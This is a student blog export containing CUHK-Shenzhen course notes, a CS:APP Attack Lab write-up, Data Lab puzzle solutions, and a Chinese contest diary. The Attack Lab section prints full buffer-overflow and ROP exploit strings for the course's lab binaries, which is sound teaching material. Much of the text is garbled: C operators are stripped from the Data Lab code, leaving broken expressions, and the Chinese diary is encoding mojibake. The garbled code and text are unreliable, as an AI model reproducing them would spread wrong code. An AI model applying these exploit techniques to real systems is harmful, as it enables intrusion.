[{"title":"CUHK-Shenzhen Notes","path":"/2026/01/01/CUHKSZ Notes/","content":"MAT-1011 Calculus (Extended) IIt provides students with a good foundation for more advanced courses in the MATH major. Topics include functions, sequences, limits and continuity, differentiation, and integration and their applications. MAT1011 and its continuation MAT1012 are for students who are strongly inclined to declare for MATH. The treatment in these classes is adapted to the future needs in the MATH programme and aligns the students to the recommended study scheme in the MATH programme. MAT1011https://sunchaoyi923.github.io/file/MAT1011.pdf DDA-2001 Introduction to Data ScienceThe course will introduce the various areas of Data Science. It will give students a tour of the enormous applications of data science in our society. Along the tour, the course will also introduce different tools in the data science which will enable those applications. It will introduce the courses offered in the school and the research areas of professors. DDA2001https://sunchaoyi923.github.io/file/DDA2001.pdf MAT-1002 Calculus IIThis course is a continuation of Calculus I, covering series and multivariable calculus. It emphasizes intuitive and conceptual understanding of theory of series and multivariable calculus, as well as computation skills; it cultivates the ability to use Calculus to solve problems within mathematics and from other scientific disciplines. MAT1002https://sunchaoyi923.github.io/file/MAT1002.pdf MAT-2041 Linear Algebra and ApplicationsThis course introduces the fundamental concepts and techniques of linear algebra, including: system of linear equations, matrices, vectors, vector spaces, determinants, linear transformations, orthogonality, eigen-theory, quadratic forms and singular value decomposition. MAT2041https://sunchaoyi923.github.io/file/MAT2041.pdf CSC-3001 Discrete MathematicsThis course introduces the relevant mathematical concepts and techniques in computer science with emphasis on proofs and rigorous reasoning. Topics include: logics, methods of proofs, recursion, elementary number theory, graph theory, counting. CSC3001 Noteshttps://sunchaoyi923.github.io/file/CSC3001%20Notes.pdf CSC3001 Reviewhttps://sunchaoyi923.github.io/file/CSC3001%20Review.pdf STA-2001 Probability and Statistics IThis course is to study the basic concepts of probability and statistics. Topics include elementary probability theory, random variables, probability distributions, sampling distributions, convergence of random variables, laws of large numbers and central limit theorem. STA2001https://sunchaoyi923.github.io/file/STA2001.pdf CSC-1003 Introduction to Computer Science and Java ProgrammingThe course introduces basic concepts in computer science and application development using Java language, not assuming the previous related background of the students. Topics include: elements of programming: variables; assignment statements; built-in types of data; conditionals and loops; arrays; and input/output. functions: highlights the idea of dividing a program into components that can be independently developed and maintained. object-oriented programming: emphasizes the concept of a data type and its implementation, using Java class mechanism. basic concepts in computer science: discusses a few essential algorithms, data structures, and notions in other popular languages such as Python. CSC1003 Midterm Reviewhttps://sunchaoyi923.github.io/file/CSC1003%20Midterm%20Review.pdf CSC-3200 Data Structures and Advanced ProgrammingThe course focuses on the introduction of C/C++ language and various commonly used data types. Topics include C/C++ language basics, function and library, string and stream, pointer and dynamic memory management, class and template. Abstract data types such as array, linked list, stack, queue, tree, setï¼Œhashtable, graph and their implementations using C++ will be introduced in this class. CSC3200 Final Reviewhttps://sunchaoyi923.github.io/file/CSC3200%20Final%20Review.pdf CSC-4303 Network ProgrammingThe course introduces basic network protocols and programming practices, such as TCP/IP, HTTP, socket programming, and RPC. It also presents the design and implementation of real-world networked systems, including distributed file systems and computation frameworks. CSC4303https://sunchaoyi923.github.io/file/CSC4303 CSC-3060 Introduction to Computer SystemsThe course provides a programmerâ€™s view of how computer systems execute programs, store information, and communicate. It enables students to become more effective programmers, especially in dealing with issues of performance, portability and robustness. It also serves as a foundation for courses on compilers, networks, and operating systems, where a deeper understanding of systems-level issues is required. Topics include: digital logic design, machine-level code and its generation, performance evaluation and optimization, computer arithmetic, memory organization and management, networking technology and protocols, and supporting concurrent computation. CSC3060https://sunchaoyi923.github.io/file/CSC3060","categories":["Academy"]},{"title":"CMU CS:APP Attack Lab","path":"/2025/12/28/Attack Lab/","content":"CS:APP Attack Lab ReportName SUNCHAOYI Use the -q flag when running the target programs to avoid connecting to the grading server: ./ctarget -q / ./rtarget -q. Part 1 Code Injection AttacksLevel 1First use objdump -d ctarjet ctarjet.asm to analyze the machine instructions of the target program. Analysis of the disassembly reveals the addresses of the key functions: test, getbuf, and touch1. The objective is to modify the control flow when getbuf returns. Normally, getbuf returns to address 0x401976 within test. The goal is to overwrite this return address with the address of touch1, which is 0x4017c0. Examination of the getbuf function shows that it allocates 0x28 (40) bytes on the stack for the input buffer. To successfully redirect execution, the exploit must completely fill this 40-byte buffer and then overwrite the subsequent 8 bytes on the stack, which hold the saved return address. The target address, 0x4017c0, must be written in little-endian byte order in x86-64. Therefore, the exploit string is: 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00c0 17 40 00 00 00 00 00 Create a text file (e.g., exploit.txt) and construct the attack string according to the specified format (two hex digits per byte, separated by spaces). Use the following pipeline to convert the text file to raw bytes and feed them to the target program: ./hex2raw exploit.txt | ./ctarget. Level 2The goal is to redirect program execution from getbuf to touch2 by injecting code that sets %rdi to the cookie value, exploiting a buffer overflow vulnerability in the Gets() function call. The initial step involves locating the call site of the Gets function. The instruction call 401a40 Gets is found at address 0x4017af. Using GDB, a breakpoint is set at this address to inspect the runtime stack state. (gdb) b *0x4017af(gdb) r -q(gdb) display /x %rsp The inspection reveals the stack pointer (%rsp) holds the value 0x5561dc78, which indicates the starting address of the input buffer allocated by getbuf. The core of the exploit is a short sequence of machine instructions. This sequence is designed to load the cookie value (0x59b997fa) into the %rdi register and then transfer control to the touch2 function. movq %0x59b997fa, %rdipushq %0x4017ecretq To obtain the raw machine code bytes corresponding to this assembly, the source is assembled and disassembled using gcc and objdump. gcc -c exploit.sobjdump -d exploit.o The final exploit string is constructed by placing this instruction byte sequence at the beginning of the buffer, padding the remaining buffer space up to 40 bytes with zeros, and then overwriting the saved return address on the stack. The return address is set to 0x5561dc78, the bufferâ€™s start address, so that the ret instruction in getbuf transfers control to the injected code. The complete byte string is: 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 Certainly. The exploit code may be positioned at any valid location within the buffer area. The following configuration represents an alternative valid solution: 00 00 00 00 00 00 00 0048 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0080 dc 61 55 00 00 00 00 Level 3The key distinction is that Level 2 injects and executes code before any subsequent function calls overwrite the stack, whereas Level 3 must position its injected string in a region of the stack that will not be overwritten by the subsequent local buffer (cbuf[110]) allocated within the hexmatch function. The cookie value must be converted into its hexadecimal string representation: 35 39 62 39 39 37 66 61 (corresponding to 59b997fa). After getbuf returns, its stack memory is effectively recycled and reused by touch3 and hexmatch. Due to the random offset used within hexmatch, the only consistently safe area for storing data is within the test functionâ€™s preserved stack region. Inspection of the stack pointer at the entry to touch3 reveals %rsp = 0x5561dca0. Therefore, a safe location for the cookie string is at 0x5561dca8, just above this address. (gdb) b getbuf(gdb) p/x %rsp%1 = 0x5561dca0 Verification using gdb confirms the safety of this address: ./hex2raw exploit.txt level.raw(gdb) b touch3(gdb) b hexmatch(gdb) r -q level.raw(gdb) p/x %rsp%1 = 0x5561dca8(gdb) c(gdb) p/x %rsp%2 = 0x5561dc98 Stack Layout Analysis: High addressâ”‚ â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dcd0â”‚ Other parts of test frame â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dcc8â”‚ Return address â”‚â”‚ (overwritten to 0x5561dca0) â”‚ â† exploit control flowâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dcc0â”‚ Possibly free â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dcb8â”‚ Possibly free â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dcb0â”‚ Potential injection point â”‚â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dca8â”‚ rsp position at touch3 entry â”‚ â† rsp value you observedâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dca0â”‚ touch3 saved rbx â”‚ â† written by touch3 push %rbxâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dc98â”‚ hexmatch return address â”‚ â† written by call hexmatchâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dc90 â”‚ hexmatch saved r12 â”‚ â† written by push %r12 â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dc88 â”‚ hexmatch saved rbp â”‚ â† written by push %rbp â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dc80 â”‚ hexmatch saved rbx â”‚ â† written by push %rbx â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dc78 â”‚ Original getbuf buffer area â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ 0x5561dc00 â”‚ Start of hexmatchs cbuf[110]â”‚ â† new stack top after add -128! â”‚ ... â”‚ â”‚ cbuf[0]...cbuf[109] â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ Remaining hexmatch frame â”‚ Low Address Address 0x5561dca8 remains safe because touch3â€˜s push %rbx first decrements %rsp by 8 and then stores the value of %rbx at 0x5561dca0, leaving 0x5561dca8 untouched. The injected code should therefore set up the argument and transfer control: movq %0x5561dca8, %rdipushq %0x4018faret Using the same construction method as Level 2, the final exploit string becomes (0x5561dc78 %\\sim% 0x5561dca8) : 48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 0035 39 62 39 39 37 66 61 Placing the cookie string at 0x5561dcb0 is also feasible, requiring additional padding: 48 c7 c7 b0 dc 61 55 68fa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 0000 00 00 00 00 00 00 0035 39 62 39 39 37 66 61 Part 2 Return-Oriented ProgrammingROP is an exploitation technique that builds attack payloads by chaining existing, ret-terminated instruction snippets (gadgets). Gadgets are located via byte-aligned scanning of executable memory. The attacker controls the stack to sequence these gadgets, with each ret instruction transferring control to the next gadget in the chain. In the assignment example, the byte sequence 48 89 c7 c3 is extracted from the instruction c7 07 d4 48 89 c7 movl %0xc78948d4, (%rdi). When execution begins at the 48 byte, this sequence is interpreted as the instruction movq %rax, %rdi. This is possible because x86-64 instructions are variable-length and lack alignment boundaries, allowing the same byte stream to be decoded as different instructions depending on the starting offset. Level 2 movq %0x59b997fa, %rdipushq %0x4017ecretq This is the asnwer in Part 2. The straightforward approach would be to find a gadget that directly sets the value 0x59b997fa into the %rdi register. However, searching through the gadget farm reveals that no such gadget exists in the available code. Since a direct movq instruction with the immediate value is unavailable, an indirect approach is employed: Place the value on the stack The cookie value 0x59b997fa is included in the exploit string. Use popq %rax Extract the value from the stack into a register. Transfer to %rdi Move the value from %rax to %rdi using movq %rax, %rdi. Return to touch2 The popq %rax instruction corresponds to the byte 58. Examining the disassembled code reveals the following memory content 4019a7: 8d 87 51 73 58 90. This sequence contains 58 followed by 90 (a nop instruction), forming a valid popq %rax; nop gadget. The execution should start at address 0x4019ab to align the instruction boundaries correctly. The movq %rax, %rdi instruction corresponds to the bytes 48 89 c7. The disassembly shows 4019a0: 8d 87 48 89 c7 c3. Starting execution at address 0x4019a3 causes the sequence 48 89 c7 c3 to be interpreted as movq %rax, %rdi; ret. The complete exploit string is structured as follows: 00 00 00 00 00 00 00 00 # Padding for the buffer (40 bytes)00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00 # Address of popq %rax gadget (0x4019ab)fa 97 b9 59 00 00 00 00 # Cookie value to be popped into %raxa3 19 40 00 00 00 00 00 # Address of movq %rax, %rdi gadget (0x4019a3)ec 17 40 00 00 00 00 00 # Address of touch2 function (0x4017ec) Level 3movq %0x5561dca8, %rdipushq %0x4018faret This represents the ideal code injection solution from Part 2. However, due to the implementation of two defensive techniques (stack randomization and non-executable stack), the exploit must instead utilize the current stack pointer combined with a calculated offset. The fundamental approach is outlined below: movq %rsp, %rax # Capture current stack pointerpopq %rbx # Load offset value from stackaddq %rbx, %rax # Calculate string address: rsp + offsetmovq %rax, %rdi # Pass address as first argument to touch3 Gadget Identification and Chain Construction movq %rsp, %rax (Byte pattern 48 89 e0) Located at: 401a03: 8d 87 41 48 89 e0 Execution starts at 0x401a06 to align the instruction. movq %rax, %rdi (Byte pattern 48 89 c7) Only popq %rax is available for loading data, not popq %rbx. Therefore, %rax is used as the primary data carrier. Located at: 4019c3: c7 07 48 89 c7 90 Execution starts at 0x4019c5. popq %rax (Byte pattern 58) Located at: 4019a7: 8d 87 51 73 58 90 Execution starts at 0x4019ab. The offset value popped into %rax must have its upper 32 bits as zeros to be compatible with subsequent 32-bit operations. Since a direct movq %rax, %rsi gadget is unavailable, and movl %eax, %edi (89 c7 at 0x4019c6) cannot be constructed subsequently, an alternative register transfer chain using 32-bit moves is constructed: movl %eax, %edx (Byte pattern 89 c2) Located at: 4019db: b8 5c 89 c2 90 Execution starts at 0x4019dd. movl %edx, %ecx (Byte pattern 89 d1) Located at: 401a68: b8 89 d1 08 db Execution starts at 0x401a6a. The following orb %bl, %bl instruction (08 db) has no net effect as it performs a bitwise OR of %bl with itself. movl %ecx, %esi (Byte pattern 89 ce) Located at: 401a11: 8d 87 89 ce 90 90 Execution starts at 0x401a13. lea (%rdi,%rsi,1),%rax This gadget performs the crucial address addition: rax = rdi + rsi. Located at: 0x4019d6, i.e. add_xy function. movq %rax, %rdi (Reuse gadget from step 2) Finalizes the setup of the first argument for touch3. The offset value of 0x48 is calculated as the difference between the stringâ€™s position in the exploit buffer (0x78) and the value stored in %rdi (0x30). The constructed exploit string, incorporating padding, gadget addresses, the offset value, and the cookie string, is as follows: 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0006 1a 40 00 00 00 00 00 # gadget1: movq %rsp, %rax @0x401a06c5 19 40 00 00 00 00 00 # gadget2: movq %rax, %rdi @0x4019c5ab 19 40 00 00 00 00 00 # gadget3: popq %rax @0x4019ab48 00 00 00 00 00 00 00 # offset value (0x48)dd 19 40 00 00 00 00 00 # gadget4: movl %eax, %edx @0x4019dd6a 1a 40 00 00 00 00 00 # gadget5: movl %edx, %ecx @0x401a6a13 1a 40 00 00 00 00 00 # gadget6: movl %ecx, %esi @0x401a13d6 19 40 00 00 00 00 00 # gadget7: lea (%rdi,%rsi,1),%rax @0x4019d6c5 19 40 00 00 00 00 00 # gadget8: movq %rax, %rdi @0x4019c5fa 18 40 00 00 00 00 00 # Address of touch3 @0x4018fa35 39 62 39 39 37 66 61 # Cookie string: 59b997fa (hex ASCII)","categories":["Academy"]},{"title":"CMU CS:APP Data Lab","path":"/2025/12/25/Data Lab/","content":"Data Labhttps://sunchaoyi923.github.io/file/Data%20Lab.pdf CS:APP Data Lab ReportName SUNCHAOYI IntroductionThis report documents the solutions to the CS:APP Data Lab problems. The goal of the lab is to solve a series of programming puzzles under strict constraints, using only a limited set of C operators to manipulate integer and floating-point bit patterns. Report bitXor Description: $x \\oplus y$. Legal ops: ~ Solution: Ops = 8 \\begin{align*} A \\oplus B &= \\overline{A} B \\cup A \\overline{B} \\\\ &= \\overline{\\overline{\\overline{A} B} \\cap \\overline{A \\overline{B}}} \\\\ \\end{align*} int bitXor (int x,int y) int a = ~((~x) y); int b = ~(x (~y)); return ~(a b); Ops = 7 (Opt.) \\begin{align*} A \\oplus B &= (A \\cup B) \\cap \\overline{A \\cap B} \\\\ &= \\overline{\\overline{A} \\cap \\overline{B}} \\cap \\overline{A \\cap B}\\\\ \\end{align*} int bitXor (int x,int y) return ~(~x ~y) ~(x y); tmin Description: Return minimum twoâ€™s complement integer. Legal ops: ! ~ ^ | + Solution: int tmin (void) return 1 31; isTmax Description: Returns 1 if $x$ is the maximum, twoâ€™s complement number, and 0 otherwise. Legal ops: ! ~ ^ | + Solution: The maximum twoâ€™s complement integer $T_{\\text{max}}$ has the property $x + 1 = \\sim x$, i.e. $(x + 1) \\oplus (\\sim x) = 0$. $x = -1$ is a special case ($\\texttt{0xffffffff}$) that need to be excluded. int isTmax (int x) return !((~(x + 1)) ^ x) !!(x + 1); allOddBits Description: Return 1 if all odd-numbered bits in word set to 1. Legal ops: ! ~ ^ | + Solution: Construct a number whose odd-numbered bits are all 1, i.e. the 32-bit pattern $\\texttt{0xAAAAAAAA}$. Ops = 9 int allOddBits (int x) int mask = (0xAA 24) | (0xAA 16) | (0xAA 8) | 0xAA; return !((x mask) ^ mask); Ops = 7 (Opt.) int allOddBits (int x) int a = 0xAA 8; int b = a | 0xAA; int c = b 16 | b; return !((x c) ^ c); negate Description: Return $-x$. Legal ops: ! ~ ^ | + Solution: \\begin{cases} x + (-x) = 0\\\\ x + (\\sim x) = -1 \\end{cases} \\Longrightarrow -x = (\\sim x) + 1 int negate (int x) return (~x) + 1; isAsciiDigit Description: Return 1 if $0x30 \\le x \\le 0x39$ (ASCII codes for characters 0 to 9). Legal ops: ! ~ ^ | + Solution: Upper 24 bits must be zero. Bits 4-7 must equal 0011. Lower 4 bits must be in range 0000 to 1001. (Check whether bit 3 is 0 to have more detailed classification.) Ops = 14 int isAsciiDigit (int x) int a = !(x 8); int b = !(x 4 ^ 0x3); int low = x 0xF; int c = !(low 3) | !(low 1 ^ 0x4); return a b c; Ops = 7 (Opt.) No need to use variable $a$ to checker upper 24 bits. use +6 to bound lower 4 bits within 1111. int isAsciiDigit (int x) int a = x 4 ^ 3; int b = ((x 0xF) + 6) 4; return !(a | b); conditional Description: Same as x ? y : z. Legal ops: ! ~ ^ | + Solution: Convert any non-zero $x$ to boolean. Create a mask that is either all zeros ($\\texttt{0x00000000}$) or all ones ($\\texttt{0xFFFFFFFF}$). Use the mask to select between $-y$ and $-z$. Ops = 14 int conditional (int x,int y,int z) int op = !!x; int a = (~op) + 1; int b = (~a) ((~y) + 1); // when mask = 0x00000000, b = -y; otherwise b = 0 int c = a ((~z) + 1); // when mask = 0xFFFFFFFF, c = -z; otherwise c = 0 return y + z + b + c; Ops = 8 (Opt.) int conditional (int x,int y,int z) int mask = (~(!!x)) + 1; return (y mask) | (z (~mask)); // one side must equal to 0 isLessOrEqual Description: If $x \\le y$ then return 1, else return 0. Legal ops: ! ~ ^ | + Solution: Different signs: If $x$ is negative and $y$ is non-negative, then $x \\leq y$ is always true. Same signs: We can safely compute $y - x$ without overflow and check if itâ€™s non-negative. int isLessOrEqual (int x,int y) int signx = x 31 1; int signy = y 31 1; int diff = signx ^ signy; int a = diff signx; int b = !diff !((y + ((~x) + 1)) 31); // y - x = 0 return a | b; logicalNeg Description: Implement the ! operator using all of the legal operators except !. Legal ops: ~ ^ | + Solution: If $x = 0$, both $x$ and $-x$ have sign bit 0. Otherwise either $x$ or $-x$ have sign bit 1. $x | (-x)$ is $\\texttt{0x00000000}$ or $\\texttt{0xFFFFFFFF}$, just add 1 to solve it. int logicalNeg (int x) return ((x | ((~x) + 1)) 31) + 1; howManyBits Description: Return the minimum number of bits required to represent $x$ in twoâ€™s complement. Legal ops: ! ~ ^ | + Solution: For $x 0$ find the highest 0-bit, $x \\ge 0$ find the highest 1-bit. Use x ^ (x 31) to transform $x$ into the latter case. Use divide-and-conquer approach for the most significant 1-bit, and finally add the sign bit. int howManyBits (int x) int b16,b8,b4,b2,b1,b0; x = x ^ (x 31); b16 = (!!(x 16)) 4; x = b16; b8 = (!!(x 8)) 3; x = b8; b4 = (!!(x 4)) 2; x = b4; b2 = (!!(x 2)) 1; x = b2; b1 = !!(x 1); x = b1; b0 = x; return b16 + b8 + b4 + b2 + b1 + b0 + 1; // sign floatScale2 Description: Return bit-level equivalent of expression $2 \\times f$ for floating point argument $f$. Legal ops: Any integer/unsigned operations incl. ||, . Also if, while. Solution: Extraction the sign bit, exponent field and fraction field. When $exp = \\texttt{0xFF}$, just return it; When $exp = \\texttt{0x00}$, $frac \\times 2$; otherwise $exp + 1$. unsigned floatScale2 (unsigned uf) unsigned sign = uf 31 0x1; unsigned exp = (uf 23) 0xFF; unsigned frac = uf 0x7FFFFF; if (exp == 0xFF) return uf; else if (exp == 0x0) frac = 1; else ++exp; return (sign 31) | (exp 23) | frac; floatFloat2Int Description: Return bit-level equivalent of expression (int) $f$ for floating point argument $f$. Legal ops: Any integer/unsigned operations incl. ||, . Also if, while. Solution: Converting to integer with truncation: \\text{int}(f) = \\begin{cases} 0 & \\text{if } |f| < 1 \\\\ \\text{trunc}\\left(1.f \\times 2^{e-127}\\right) & \\text{if } 1 \\leq |f| < 2^{31} \\\\ \\text{INT\\_MIN} & \\text{otherwise (overflow)} \\end{cases}Where truncation is implemented by: When $E \\geq 23$: $1.f \\times 2^{E} = (1.f \\times 2^{23}) \\times 2^{E - 23}$ When $E 23$: Right shift discards fractional bits, i.e. $ (23 - E)$ int floatFloat2Int (unsigned uf) unsigned sign = uf 31 0x1; unsigned exp = (uf 23) 0xFF; unsigned frac = uf 0x7FFFFF; int E,M; E = exp - 127; if (E 0) return 0; if (E = 31) return 0x80000000u; M = (1 23) | frac; if (E = 23) M = E - 23; else M = 23 - E; return sign ? -M : M; floatPower2 Description: Return bit-level equivalent of the expression $2.0^x$ (2.0 raised to the power $x$). Legal ops: AAny integer/unsigned operations incl. ||, . Also if, while. Solution: Case 1 : Overflow $x E_{\\max} = e - 127 = 254 - 127 = 127$ return $\\texttt{0b01111111100â€¦0}$, i.e. $\\texttt{0x7F800000}$ Case 2 : Normalized $e = E + 127 \\in [1,254] \\Longrightarrow E \\in [-126,127]$ $V = 1.0 \\times 2^{e - 127}$ $f = 0,\\quad V \\gets (e 23) | f$ Case 3 : Denormalized $e = 0$ $V = \\overline{0.f} \\times 2^{-126} = 2^x \\Longrightarrow \\overline{0.f} = 2^{x + 126}$ minimum number is $2^{-126} \\times 2^{-23} = 2^{-149}$, i.e. put 1 on index 0. $\\Longrightarrow V \\gets 1 (x + 149)$ Case 4 : Underflow $x -149$, return 0 unsigned floatPower2 (int x) if (x -149) return 0; else if (x 127) return 0x7F800000; else if (x = -126) return (x + 127) 23; else return 1 (x + 149); Correctness Results Perf ResultsPoints Rating Errors Points Ops Puzzle1 1 0 2 7 bitXor1 1 0 2 1 tmin1 1 0 2 8 isTmax2 2 0 2 7 allOddBits2 2 0 2 2 negate3 3 0 2 7 isAsciiDigit3 3 0 2 8 conditional3 3 0 2 14 isLessOrEqual4 4 0 2 5 logicalNeg4 4 0 2 32 howManyBits4 4 0 2 12 floatScale24 4 0 2 16 floatFloat2Int4 4 0 2 9 floatPower2Score = 62/62 [36/36 Corr + 26/26 Perf] (128 total operators)","categories":["Academy"]},{"title":"2025 CCPC é‡åº†ç«™","path":"/2025/12/02/CCPC Chongqing25/","content":"CCPC é‡åº†ç«™Day -18:00 åè½¦å’Œç‰¢é‚“ä¸€èµ·èµ°ï¼Œè·¯ä¸Šå°å µï¼Œä½†æ˜¯ä¸€ä¸ªå°æ—¶ä¸åˆ°å°±åˆ°è¾¾äº†æœºåœºï¼Œå–œæå«æ˜Ÿå…ã€‚è¿˜æ˜¯æ—©åˆ°äº†å¥½ä¹…ï¼Œæ‰“å¼€ç”µè„‘å‘ç° STA æœ‰ä½œä¸šäº†ï¼Œæœæ–­å¼€å†™ã€‚ç™»æœºäº†ï¼Œåªå¥½å…ˆåˆä¸Šç”µè„‘ã€‚ä½†æ˜¯åœ¨é£æœºé‡Œåˆç­‰äº†ä¸€ä¼šå„¿ï¼Œä¸å°å¿ƒåœ¨èµ·é£å‰å°±æŠŠä½œä¸šç»™å†™å®Œäº†ï¼Œäºæ˜¯å¼€ç¡ã€‚ä¸¤å°æ—¶å·¦å³è½åœ°é‡åº†ï¼Œç›´å¥”å®¾é¦†ã€‚ æ­‡äº†ä¸€ä¼šå„¿ï¼Œåˆ°æ™šä¸Šå»æ´ªå´–æ´é™„è¿‘åƒäº†ç«é”…ï¼Œç„¶åèµ°ä¸Šå¤§æ¡¥è¿œè§‚æ´ªå´–æ´ï¼Œè¿˜æ˜¯è¢« 6D åŸå¸‚ç•¥å¾®éœ‡æƒŠäº†ä¸€ä¸‹ï¼Œå¯¼èˆªçš„å®šä½ä¸€ç›´åœ¨é£˜ï¼Œæ‰€ä»¥èµ°é”™äº†å¥½å‡ æ¬¡ã€‚ Day 0å…ˆæ¥ç­¾åˆ°ï¼Œç™½å«–äº†ä¸ªæ°´æ¯ï¼Œé¢†äº†ç‰©èµ„ï¼Œä½†æ˜¯æ²¡æœ‰å•¥å¥½çš„ä¼´æ‰‹ç¤¼ã€‚ æ‰“ä¸ªçƒ­èº«èµ›ï¼Œæ¥é™ªç‰¢é‚“åŒæ’ã€‚ç¬¬ä¸€é¢˜æ€ä¹ˆæ‰¾è§„å¾‹ï¼Œç¥ç§˜ï¼Œç”¨æ‹‰æ’ä¸æ˜¯æ€ä¹ˆè§£é‡Šéƒ½å¯ä»¥å˜›ï¼ˆæœ€åç‹‚ WA 11 æ¬¡æ€»ç®—è¯•åˆ°äº†å‡ºé¢˜äººæƒ³è¦çš„ç­”æ¡ˆã€‚ å‘ç°ç¬¬ä¸‰é¢˜åšè¿‡äº†ï¼Œæ‚„æ‚„æå‡ºæ‰‹æœºè´ºäº†ä¸€ä¸‹è¿‡é¢˜çš„ä»£ç ã€‚ ç„¶åæƒ³ç¬¬äºŒé¢˜ï¼Œå¸¦ä¿®çš„åˆå¹¶æœå­å¤–åŠ  $2^i$ çš„é¢å¤–æ¡ä»¶ï¼ŒåŠ äº†è¿™ä¸ªé™åˆ¶ä»¥åå°±å¯ä»¥äºŒè¿›åˆ¶åˆ†å—ï¼Œç„¶åè´ªå¿ƒé€å—ç´¯åŠ ã€‚ä½†æ˜¯èµ›æ—¶æ²¡æå‡ºæ¥ï¼Œåæ¥å¬äººè®²äº†æ‰æ‚Ÿåˆ°ã€‚ æ™šä¸Šå°å‹å›¢å»ºï¼Œæ•™ç‰¢é‚“å’Œä½¬æ‰“å°çƒã€‚ Day 1å¼€å±€å‘ç°ç­¾åˆ° A å’Œ Hï¼ŒZlw å…ˆå†™æ¨¡æ‹Ÿé¢˜ Aï¼Œç„¶åæˆ‘çœ‹ Hã€‚ä¸€å¼€å§‹ H æƒ³è¦åˆ†ç±»è®¨è®ºï¼Œä½†æ˜¯ä¸€çœ‹æ•°æ®èŒƒå›´æœæ–­æšä¸¾å…¶ä¸­ä¸€ä¸ªå‚æ•°ã€‚ä¸­é—´æ²¡æƒ³æ¸…æ¥šï¼Œè¿˜æŠŠä½¬ä»æœºå­ä¸Šè¸¹ä¸‹æ¥ä¸¤æ¬¡åˆæ§ä¸Šå»ä¸¤æ¬¡ã€‚æœ€åä»–è¿‡å®Œ A ä»¥åæˆ‘å† fix äº†æˆ‘çš„åšæ³•ï¼Œä¸­é—´å› ä¸ºå¥‡å¶æ€§ WA äº†ä¸€ä¸ªæ ·ä¾‹ï¼Œçœ‹äº†å¾ˆä¹…æ‰å‘ç°é—®é¢˜ã€‚ æ¥ä¸‹å» Zlw å’Œ Sky æƒ³äº† Eï¼Œè§‰å¾—å¯ä»¥äºŒåˆ†ç­”æ¡ˆï¼Œäºæ˜¯æœæ–­ç”¨ä¼˜å…ˆé˜Ÿåˆ—ç»´æŠ¤ï¼Œåœ¨ä¸€å°æ—¶ä»¥å†…å°±è¿‡äº†ã€‚ ä¹‹åä¾¿æ˜¯é»‘æš—çš„ 3 h æ—¶é—´ï¼Œæˆ‘å’Œ Sky 